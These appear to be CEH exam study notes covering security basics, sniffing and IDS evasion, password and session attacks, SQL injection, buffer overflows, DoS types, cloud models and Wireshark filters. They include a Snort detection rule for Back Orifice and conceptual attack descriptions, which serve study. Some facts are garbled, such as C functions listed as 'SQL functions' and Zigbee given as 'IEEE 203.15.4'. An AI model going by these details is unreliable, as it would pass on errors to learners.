Basics


CIA Triad - Confidentiality, integrity, availability, Authenticity, Non-repudiation


Confidentiality - is important to protect sensitive information from being disclosed to unauthorized parties. This includes protecting data at rest, in transit, and in use. Common techniques used to maintain confidentiality include encryption, access controls, and data masking.
Integrity - is important to ensure that information has not been tampered with or modified in an unauthorized way. This includes protecting data from unauthorized modification, deletion or addition. Common techniques used to maintain integrity include digital signatures, message authentication codes, and data hashing.
Availability - is important to ensure that information and systems are accessible to authorized users when they need them. This includes protecting against denial of service attacks and ensuring that systems are highly available and can withstand failures. Common techniques used to maintain availability include load balancing, redundancy, and disaster recovery planning.
Authenticity - is important to ensure that information and communication come from a trusted source. This includes protecting against impersonation, spoofing and other types of identity fraud. Common techniques used to establish authenticity include authentication, digital certificates, and biometric identification.
Non-repudiation - is important to ensure that a party cannot deny having sent or received a message or transaction. This includes protecting against message tampering and replay attacks. Common techniques used to establish non-repudiation include digital signatures, message authentication codes and timestamps.

Sniffing and Evasion
IPV4 AND IPV6
IPv4 == unicast, multicast, and broadcast
IPv6 == unicast, multicast, and anycast.
IPv6 unicast and multicast scope includes link local, site local and global.

MAC ADDRESS
First half = 3 bytes (24bits) = Org UID
Second half = unique number

NAT (NETWORK ADDRESS TRANSLATION)
Basic NAT is a one-to-one mapping where each internal IP== a unique public IP.
Nat overload (PAT) == port address translation. Typically used as is the cheaper option.

STATEFUL INSPECTION
Concerned with the connections. Doesn’t sniff ever packet, it just verifies if it’s a known connection, then passes along.

HTTP TUNNELLING
Crafting of wrapped segments through a port rarely filtered by the Firewall (e.g., 80) to carry payloads that may otherwise be blocked.

IDS EVASION TACTICS
Slow down OR flood the network (and sneak through in the mix) OR fragmentation

TCPDUMP SYNTAX
#~tcpdump flag(s) interface

SNORT IDS	
It has 3 modes:	Sniffer/Packet logger/ Network IDS.
Config file: /etc/snort, or c:snortetc #~alert tcp!HOME_NET any ->$HOME_NET 31337 (msg : “BACKDOOR ATTEMPT-Back-orifice.”)	Any packet from any address !=home network. Using any source port, intended for an address in home network on port 31337, send msg.
Span port: port mirroring	False Negative: IDS incorrectly reports stream clean

LM HASHING
7 spaces hashed: AAD3B435B51404EE

Attacking a System
C|EH RULES FOR PASSWORDS
Must not contain user’s name. Min 8 chars.
3 of 4 complexity components. E.g., Special, Number, Uppercase, Lowercase

ATTACK TYPES
Passive Online: Sniffing wire, intercept clean text password / replay / MITM
Active Online: Password guessing.
Offline: Steal copy of password i.e., SAM file. Cracking efforts on a separate system
Non-electronic: Social Engineering

SIDEJACKING
Steal cookies exchanged between systems and use tp perform a replay-style attack.

SESSION HIJACKING
Refers to the active attempt to steal an entire established session from a target
1. Sniff traffic between client and server
2. Monitor traffic and predict sequence
3. Desynchronise session with client
4. Predict session token and take over session
5. Inject packets to the target server

AUTHENTICATION TYPES
Type 1: Something you know
Type 2: Something you have
Type 3: Something you are

KERBEROS
Kerberos makes use of symmetric and asymmetric encryption technologies and involves:
KDC: Key Distribution Centre
AS: Authentication Service
TGS: Ticket Granting Service
TGT: Ticket Granting Ticket
Process
1. Client asks KDC (who has AS and TGS) for ticket to authenticate throughout the network. this request is in clear text.
2. Server responds with secret key. hashed by the password copy kept on AD server (TGT).
3. TGT sent back to server requesting TGS if user decrypts.
4. Server responds with ticket, and client can log on and access network resources.

REGISTRY
2 elements make a registry setting: a key (location pointer), and value (define the key setting).
Rot level keys are as follows:
HKEY_LOCAL_MACHINE_Info on Hard/software
HKEY_CLASSES_ROOT ― Info on file associations and Object Linking and Embedding (OLE) classes
HKEY_CURRENT_USER ― Profile info on current user
HKEY_USERS ― User config info for all active users
HEKY_CURRENT-CONFIG―pointer tohardware Profiles.
HEKY_LOCAL-MACHINESoftwareMicrosoftWindowsCurrentVersion
RunServicesOnce

TYPES OF SOCIAL ENGINEERS
Insider Associates: Limited Authorized Access
Insider Affiliates: Insiders by virtue of Affiliation that spoof the identity of the Insider
Outsider Affiliates: Non-trusted outsider that use an access point that was left open

Physical Security
3 MAJOR CATEGORIES OF PHYSICAL SECURITY MEASURES
Physical measures: Things you taste, touch, smell
Technical measures: smart cards, biometrics
Operational measures: policies and procedures

Web-Based Hacking
CSRF – CROSS SITE REQUEST FORGERY
DOT-DOT-SLASH ATTACK
Variant of Unicode or un-validated input attack
SQL INJECTION ATTACK TYPES
Union Query: Use the UNION command to return the union of target Db with a crafted Db
Tautology: Term used to describe behavior of a Db when deciding if a statement is true.
Blind SQL Injection: Trial and Error with no responses or prompts.
Error based SQL Injection: Enumeration technique. Inject poorly constructed commands to have Db respond with table names and other information

BUFFER OVERFLOW
A condition that occurs when more data is written to a buffer than it has space to store and results in data corruption. Caused by insufficient bounds checking, a bug, or poor configuration in the program code.
Stack: Premise is all program calls are kept in a stack and performed in order. Try to change a function pointer or variable to allow code exe
Heap: Takes advantage of memory “on top of” the application (dynamically allocated). Use program to overwrite function pointers
NOP Sled: Takes advantage of instruction called “no-op”. Sends a large # of NOP instructions into buffer. Most IDS protect from this attack.
Dangerous SQL functions
The following do not check size of destination buffers: gets() strcpy() stract() printf()


Wireless  Network Hacking
WIRELESS SNIFFING
Compatible wireless adapter with promiscuous mode is required, but otherwise pretty much the same as sniffing wired.

Camo: Disguise as legit files.
Cavity: Hides in empty areas in exe.
Marco: Written in MS Office Macro Language
Multipartite: Attempts to infect files and boot sector at same time.
Metamorphic virus: Rewrites itself when it infects a new file.
Network: Spreads via network shares.
Polymorphic virus: Constantly changing signature makes it hard to detect.
Shell virus: Like boot sector but wrapped around application code, and run on application start.
Stealth: Hides in files, copies itself to deliver payload.

DOS TYPES	
SYN Attack:	Send thousands of SYN packets with a false IP address. Target will attempt SYN/ACK response. All machine resources will be engaged.
SYN Flood:	Send thousands of SYN Packets but never respond to any of the returned SYN/ACK packets. Target will run out of available connections.
ICMP Flood:	Send ICMP Echo packets with a fake source address. Target attempts to respond but reaches a limit of packets sent per second.
Application level:	Send “legitimate” traffic to a web application than it can handle.
Smurf:	Send large number of pings to the broadcast address of the subnet with source IP spoofed to target. Subnet will send ping responses to target.
Fraggle Attack:	Similar to Smurf but uses UDP.
Ping of Death:	Attacker fragments ICMP message to send to target. When the fragments are reassembled, the resultant ICMP packet is larger than max size and crashes the system

— VRFY: means validates users.
— EXPN: Tells the actual delivery addresses of aliases and mailing lists.
— RCPT TO: Defines the recipients of the message.


Cloud Solutions:

Public cloud. As the name suggests, this type of cloud deployment model supports all users who want to use a computing resource, such as hardware (OS, CPU, memory, storage) or software (application server, database) on a subscription basis. The most common uses of public clouds are for application development and testing, non-mission-critical tasks such as file-sharing, and e-mail service.

Private cloud. True to its name, a private cloud is typically infrastructure used by a single organization. The organization itself may manage such infrastructure to support various user groups. It could be managed by a service provider that takes care of it either on-site or off-site. Private clouds are more expensive than public clouds due to the capital expenditure involved in acquiring and maintaining them. However, private clouds are better able to address the security and privacy concerns of organizations today.

Hybrid cloud. In a hybrid cloud, an organization makes use of interconnected private and public cloud infrastructure. Many organizations use this model when they need to rapidly scale up their IT infrastructure, such as when leveraging public clouds to supplement the capacity available within a private cloud. For example, if an online retailer needs more computing resources to run its Web applications during the holiday season, it may attain those resources via public clouds.

Community cloud. This deployment model supports multiple organizations sharing computing resources that are part of a community; examples include universities cooperating in certain areas of research or police departments within a county or state sharing computing resources. Access to a community cloud environment is typically restricted to the members of the community.



NIST:

Cloud auditor

A cloud auditor is a party that can perform an independent examination of cloud service controls with the intent to express an opinion thereon. Audits are performed to verify conformance to standards through a review of objective evidence.

Cloud Broker is an entity that manages the use, performance and delivery of cloud services, and negotiates relationships between cloud providers and cloud consumers. As cloud computing evolves, the integration of cloud services may be too complex for cloud consumers to manage alone.

Cloud broker and its interactions with other parties

In such cases, a cloud consumer may request cloud services from a cloud broker, instead of contacting a cloud provider directly," according to NIST Cloud Computing Reference Architecture.

Cloud consumer

The cloud consumer is the principal stakeholder for the cloud computing service. A cloud consumer represents a person or organization that maintains a business relationship with, and uses the service from a cloud provider. A cloud consumer browses the service catalog from a cloud provider, requests the appropriate service, sets up service contracts with the cloud provider, and uses the service.

Cloud carrier

A carrier cloud is a class of cloud that integrates wide area networks (WAN) and other attributes of communications service providers’ carrier-grade networks to enable the deployment of highly demanding applications in the cloud. In contrast, classic cloud computing focuses on the data center, and does not address the network connecting data centers and cloud users. This may result in unpredictable response times and security issues when business-critical data are transferred over the Internet.


EC-Council's training materials:

Tier-1: Developer machines - image creation, testing and accreditation

Tier-2: Testing and accreditation systems - verification and validation of image contents, signing images and sending them to the registries

Tier-3: Registries - storing images and disseminating images to the orchestrators based on requests

Tier-4: Orchestrators - transforming images into containers and deploying containers to hosts

Tier-5: Hosts - operating and managing containers as instructed by the orchestrator


Variuos attacks and explanations:

Desynchronization Attack - A typical RFID related threat in which a tag’s key stored in the back-end database and the tag’s memory would not be the same, because of an attacker blocks the communication between the parties.

Session splicing - Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, smallsized packets to the target computer, making it very difficult for an IDS to detect the attack signatures.

Phlashing - Phlashing is a permanent denial of service (DoS) attack that exploits a vulnerability in network-based firmware updates. Such an attack is currently theoretical but if carried out could render the target device inoperable.

NetBIOS:

NetBIOS is a protocol used for File and Print Sharing under all current versions of Windows. While this in itself is not a problem, the way that the protocol is implemented can be. There are a number of vulnerabilities associated with leaving this port open.

NetBios services:

· NETBIOS Name Service (TCP/UDP: 137)

· NETBIOS Datagram Service (TCP/UDP: 138)

· NETBIOS Session Service (TCP/UDP: 139)

The NetBIOS Suffix, alternately called the NetBIOS End Character (endchar), is the 16th character of a NetBIOS name and indicates service type for the registered name. The number of record types is limited to 255; some commonly used values are:

For unique names:

· 00: Workstation Service (workstation name)

· 03: Windows Messenger service

· 06: Remote Access Service

· 20: File Service (also called Host Record)

· 21: Remote Access Service client

· 1B: Domain Master Browser – Primary Domain Controller for a domain

· 1D: Master Browser

For group names:

· 00: Workstation Service (workgroup/domain name)

· 1C: Domain Controllers for a domain (group record with up to 25 IP addresses)

· 1E: Browser Service Elections


Windows OS:

Windows OS has default TTL value of 128

According EC-Council's courseware:

"LDAP Enumeration Countermeasures

- By default, LDAP traffic is transmitted unsecured; use SSL or STARTTLS technology to encrypt the traffic.

- Select a username different from your email address and enable account lockout.

- Restrict access to Active Directory by using software such as Citrix.

- Use NTLM or any basic authentication mechanism to limit access to legitimate users.

Types of jailbreaking tools

Many different types of jailbreaks have come out over the years, differing in how and when the exploit is applied.

- Untethered Jailbreak

When a jailbroken device is booting, it loads Apple's own kernel initially. The device is then exploited and the kernel is patched every time it is turned on. An untethered jailbreak is a jailbreak that does not require any assistance when it reboots up. The kernel will be patched without the help of a computer or an application. These jailbreaks are uncommon and take a significant amount of reverse engineering to create. For this reason, untethered jailbreaks have become much less popular, with none supporting recent iOS versions.



- Tethered Jailbreak

A tethered jailbreak is the opposite of an untethered jailbreak, in the sense that a computer is required to boot. Without a computer running the jailbreaking software, the iOS device will not be able to boot at all. While using a tethered jailbreak, the user will still be able to restart/kill the device's SpringBoard process without needing to reboot. Many early jailbreaks were offered initially as tethered jailbreaks.



- Semi-tethered Jailbreak

This type of jailbreak allows a user to reboot their phone normally, but upon doing so, the jailbreak and any modified code will be effectively disabled, as it will have an unpatched kernel. Any functionality independent of the jailbreak will still run as normal, such as making a phone call, texting, or using App Store applications. To be able to have a patched kernel and run modified code again, the device must be booted using a computer.



- Semi-untethered Jailbreak

This type of jailbreak is like a semi-tethered jailbreak in which when the device reboots, it no longer has a patched kernel, but the key difference is that the kernel can be patched without using a computer. The kernel is usually patched using an application installed on the device without patches. This type of jailbreak has become increasingly popular, with most recent jailbreaks classified as semi-untethered.



WiFi LTE RADIO Hacking:

Zigbee - Protocol based on the IEEE 203.15.4 standard; - Range of 10-100 m. - Designed for small-scale projects which need wireless connection.

Filter examples:

ip.addr == 10.0.0.1 [Sets a filter for any packet with 10.0.0.1, as either the source or dest]  
ip.addr==10.0.0.1  && ip.addr==10.0.0.2 [sets a conversation filter between the two defined IP addresses]  
tcp.time_delta > .250 [sets a filter to display all tcp packets that have a delta time of greater than 250mSec in the context of their stream. Note, this filter requires TCP Conversation Timestamps to be calculated. To learn to do that, click here.]  
tcp.port==4000 [sets a filter for any TCP packet with 4000 as a source or dest port]  
tcp.flags == 0x012 [displays all TCP SYN/ACK packets - shows the connections that had a positive response. Related to this is tcp.flags.syn==1]  
ip.addr == 10.0.0.0/24 [Shows packets to and from any address in the 10.0.0.0/24 space]  
frame contains traffic [displays all packets that contain the word ‘traffic’. Excellent when searching on a specific string or user ID]  
!(arp or icmp or stp) [masks out arp, icmp, stp, or whatever other protocols may be background noise. Allowing you to focus on the traffic of interest]  
eth[0x47:2] == 01:80 [This is an example of an offset filter. It sets a filter for the HEX values of 0x01 and 0x80 specifically at the offset location of 0x47]  
tcp.analysis.flags && !tcp.analysis.window_update [displays all retransmissions, duplicate acks, zero windows, and more in the trace. Helps when tracking down slow application performance and packet loss. It will not include the window updates, since these aren't really important for me to see in most cases.] 

IPSEC:

IPsec suite:

· Authentication Header (AH) - ensures connectionless integrity
· Encapsulating Security Protocol (ESP) - provides confidentiality
· Security Association (SA)
· IKE - IKEv1 or IKEv2, depending on the version) is the protocol used to set up a security association (SA) in the IPsec protocol suite. IKE builds upon the Oakley protocol and ISAKMP. IKE uses X.509 certificates for authentication 

SQL hacking and examples

Out-of-band SQLi - leverages a database server’s ability to make DNS requests to pass data to an attacker 

In-band SQL injection is the most common and easy-to-exploit of SQL injection attacks. In-band SQL injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results.

- Union-based SQLi

Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

- Time-based blind SQLi

Time-based SQL injection is an inferential SQL injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE.
